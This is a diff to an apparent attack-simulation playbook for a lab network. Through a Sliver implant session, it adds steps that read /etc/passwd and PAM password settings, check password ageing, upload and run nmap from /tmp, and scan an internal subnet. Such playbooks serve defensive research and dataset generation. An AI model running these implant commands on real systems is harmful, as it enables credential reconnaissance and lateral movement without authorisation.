@@ -12,6 +12,7 @@ vars:
   $USER: aecid
   $SSH_KEY: "{{user_home.stdout}}/.ssh/privesc_key_videoserver"
   $IMPLANTPATH: /tmp/superimplant
+  NETWORK: "172.17.100.0/24"
 
 commands:
   - type: ssh
@@ -123,4 +124,46 @@ commands:
     recurse: True
     session: superimplant
 
+  - type: sliver-session
+    cmd: execute
+    exe: cat
+    args:
+      - /etc/pam.d/common-password
+    session: superimplant
+
+  - type: sliver-session
+    cmd: execute
+    exe: cat
+    args:
+      - /etc/passwd
+    session: superimplant
+
+  - type: sliver-session
+    cmd: execute
+    exe: chage
+    args:
+      - -l
+      - $USER
+    session: superimplant
+
+  - type: sliver-session
+    cmd: upload
+    local_path: /var/www/html/nmap
+    remote_path: /tmp/nmap
+    session: superimplant
+
+  - type: sliver-session
+    cmd: execute
+    exe: chmod
+    args:
+      - 755
+      - /tmp/nmap
+    session: superimplant
+
+  - type: sliver-session
+    cmd: execute
+    exe: /tmp/nmap
+    args:
+      - 172.17.100.0/24
+    session: superimplant
 
